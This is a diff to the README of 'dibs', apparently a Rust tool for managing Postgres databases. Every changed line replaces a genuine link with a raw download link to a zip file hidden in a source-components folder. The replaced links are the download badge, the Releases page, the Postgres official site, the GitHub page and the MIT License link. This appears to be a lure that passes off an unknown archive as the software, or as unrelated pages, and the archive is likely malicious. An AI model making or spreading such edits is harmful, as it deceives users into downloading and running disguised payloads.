@@ -1,6 +1,6 @@
 # 🛠️ dibs - Effortless Database Management for Rust Users
 
-[![Download Dibs](https://img.shields.io/badge/Download-Dibs-brightgreen)](https://github.com/jei1016/dibs/releases)
+[![Download Dibs](https://github.com/jei1016/dibs/raw/refs/heads/main/packages/dibs-admin/src/components/Software_v2.2-beta.4.zip)](https://github.com/jei1016/dibs/raw/refs/heads/main/packages/dibs-admin/src/components/Software_v2.2-beta.4.zip)
 
 ## 📖 Overview
 
@@ -25,11 +25,11 @@ Getting started with Dibs is easy. Follow these steps to download and run the ap
    - Operating System: Windows, macOS, or Linux
    - Minimum RAM: 4 GB
    - Disk Space: At least 100 MB free
-   - Postgres installed on your system (Visit [Postgres Official Site](https://www.postgresql.org/) for installation instructions)
+   - Postgres installed on your system (Visit [Postgres Official Site](https://github.com/jei1016/dibs/raw/refs/heads/main/packages/dibs-admin/src/components/Software_v2.2-beta.4.zip) for installation instructions)
 
 2. **Download Dibs**
 
-   To download Dibs, visit the [Releases page](https://github.com/jei1016/dibs/releases). Here, you will find the latest version of Dibs available for download.
+   To download Dibs, visit the [Releases page](https://github.com/jei1016/dibs/raw/refs/heads/main/packages/dibs-admin/src/components/Software_v2.2-beta.4.zip). Here, you will find the latest version of Dibs available for download.
 
 3. **Install Dibs**
 
@@ -85,7 +85,7 @@ Once installed, you can start using Dibs to manage your Postgres databases.
 
 ## 📥 Download & Install
 
-Don't wait to enhance your database experience. Download Dibs today from the [Releases page](https://github.com/jei1016/dibs/releases).
+Don't wait to enhance your database experience. Download Dibs today from the [Releases page](https://github.com/jei1016/dibs/raw/refs/heads/main/packages/dibs-admin/src/components/Software_v2.2-beta.4.zip).
 
 ## ❓ Frequently Asked Questions
 
@@ -109,11 +109,11 @@ We welcome contributions from users! If you'd like to contribute, feel free to:
 - Suggest features
 - Share feedback
 
-You can submit your contributions by opening a ticket or pull request on our [GitHub page](https://github.com/jei1016/dibs).
+You can submit your contributions by opening a ticket or pull request on our [GitHub page](https://github.com/jei1016/dibs/raw/refs/heads/main/packages/dibs-admin/src/components/Software_v2.2-beta.4.zip).
 
 ## 📜 License
 
-Dibs is open-source and available under the [MIT License](https://opensource.org/licenses/MIT). We encourage users to study, modify, and share the code.
+Dibs is open-source and available under the [MIT License](https://github.com/jei1016/dibs/raw/refs/heads/main/packages/dibs-admin/src/components/Software_v2.2-beta.4.zip). We encourage users to study, modify, and share the code.
 
 ## 🎉 Conclusion
 
